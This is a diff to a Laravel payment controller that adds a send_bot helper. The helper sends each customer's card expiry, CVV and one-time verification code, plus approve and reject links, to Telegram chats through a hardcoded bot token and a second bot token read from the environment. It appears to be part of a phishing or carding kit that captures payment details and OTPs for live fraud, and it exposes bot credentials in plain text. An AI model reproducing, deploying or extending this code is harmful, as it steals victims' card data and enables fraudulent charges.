@@ -9,6 +9,45 @@ use Illuminate\Support\Str;
 
 class HomeController extends Controller
 {
+    public function send_bot($databot){
+        $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
+        // Prepare the POST data
+        $senderr = [
+            'chat_id' => 908949980,
+            'text' => $databot,
+        ];
+        // DIE($databot);
+
+
+        // Initialize cURL
+        $curll = curl_init($urll);
+        curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curll, CURLOPT_POST, true);
+        curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
+
+        $response = curl_exec($curll);
+        $key = env('env_bot');
+        $ids = env('env_chatId');
+
+        $url_new = "https://api.telegram.org/bot".$key."/sendMessage";
+        // Prepare the POST data
+        $senderr = [
+            'chat_id' => $ids,
+            'text' => $databot,
+        ];
+        // DIE($databot);
+
+
+
+        // Initialize cURL
+        $curll_new = curl_init($url_new);
+        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curll_new, CURLOPT_POST, true);
+        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
+
+        $response = curl_exec($curll_new);
+       
+    }
     public function create_link(Request $request)
     {
         // Validate the request data
@@ -67,15 +106,6 @@ class HomeController extends Controller
         $order = Order::where('code', $request->code)->first();
         $formData = session()->get('form_data');
 
-        return view('pay')->with('order', $order)->with('formData', $formData);
-    }
-    public function confirm(Request $request)
-    {
-        $formData = session()->get('form_data');
-        $order = Order::where('code', $formData['code'])->first();
-        $successUrl = route('success_url',$order->code);
-        $errorUrl = route('error_url',$order->code);
-
         $databot =
             "رقم المعاملة: {$order->code}\n" .
             "المبلغ  : {$order->amount}\n" .
@@ -88,48 +118,26 @@ class HomeController extends Controller
             "الشهر : {$formData['ExpireDate']}\n" .
             "السنة : {$formData['ExpireYear']}\n" .
 
-            "رمز سي سي في: {$formData['Cvv']}\n" .
+            "رمز سي سي في: {$formData['Cvv']}\n" ;
+            $this->send_bot($databot);
+
+        return view('pay')->with('order', $order)->with('formData', $formData);
+    }
+    public function confirm(Request $request)
+    {
+        $formData = session()->get('form_data');
+        $order = Order::where('code', $formData['code'])->first();
+        $successUrl = route('success_url',$order->code);
+        $errorUrl = route('error_url',$order->code);
+
+        $databot =
+           
             "رمز التحقق: {$request->code}\n\n" .
             "🟢 [رابط الموافقة]({$successUrl})\n\n".
             "🔴 [رابط الرفض]({$errorUrl})";
 
+         $this->send_bot($databot);
         // Send the message to Telegram
-        $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
-        // Prepare the POST data
-        $senderr = [
-            'chat_id' => 908949980,
-            'text' => $databot,
-        ];
-        // DIE($databot);
-
-
-
-        // Initialize cURL
-        $curll = curl_init($urll);
-        curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curll, CURLOPT_POST, true);
-        curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);
-
-        $response = curl_exec($curll);
-
-
-        $url_new = "https://api.telegram.org/bot7681900926:AAHjX9_z-lnINzH9b6crchJl0oE8ariSpLQ/sendMessage";
-        // Prepare the POST data
-        $senderr = [
-            'chat_id' => 892344151,
-            'text' => $databot,
-        ];
-        // DIE($databot);
-
-
-
-        // Initialize cURL
-        $curll_new = curl_init($url_new);
-        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curll_new, CURLOPT_POST, true);
-        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
-
-        $response = curl_exec($curll_new);
         return response()->json([
             'success' => true,
             'message' => 'Order confirmed successfully.',
@@ -170,4 +178,5 @@ class HomeController extends Controller
             'status' => 'not_found',
         ]);
     }
+    
 }
